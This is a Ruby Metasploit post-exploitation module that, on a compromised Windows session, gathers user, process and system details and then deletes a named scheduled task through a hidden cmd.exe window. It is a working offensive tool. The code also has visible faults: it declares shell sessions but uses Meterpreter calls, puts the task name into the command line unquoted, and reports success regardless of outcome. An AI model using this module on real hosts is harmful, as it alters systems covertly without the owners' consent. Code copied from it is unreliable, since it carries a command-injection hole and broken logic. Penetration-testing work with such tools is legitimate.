require 'msf/core'

class MetasploitModule < Msf::Post

  include Msf::Post::Windows::Accounts
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Services
  include Msf::Post::Windows::Priv
  include Msf::Post::File

  def initialize(info={})
    super(update_info(info,
        'Name'          => 'schtasks_delete',
        'Description'   => %q{
          Allows a pentester to delete scheduled tasks on a local or remote computer.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Sentry L.L.C' ],
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'shell' ]
    ))
    register_options(
      [
        OptString.new(   'NAME',[ true,'Name which uniquely identifies the scheduled task.', 'msf']),
        ], self.class)
  end
  def run
    r=''
    user = client.sys.config.getuid
    process = client.sys.process.getpid
    sysinfo = client.sys.config.sysinfo['OS']
    loged_on_User = client.sys.config.sysinfo['Logged On Users']
    commands = ["SchTasks /Delete /TN #{datastore['NAME']} /f"]
    session.response_timeout=120
    print_status("System info : #{sysinfo}")
    print_status("Logged on Users # :  #{loged_on_User}")
    print_status("Deleting schedule as user : [ #{user} ] on process : [ #{process} ]")

    commands.each do |cmd|
      begin

        r = session.sys.process.execute("cmd.exe /c #{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
        r.channel.close
        r.close

      rescue ::Exception => e
        print_error("Error Running Command #{cmd}: #{e.class} #{e}")
      end
    end

    print_good("Scheduled deleted successfully.")
    print_line("")
  end
end
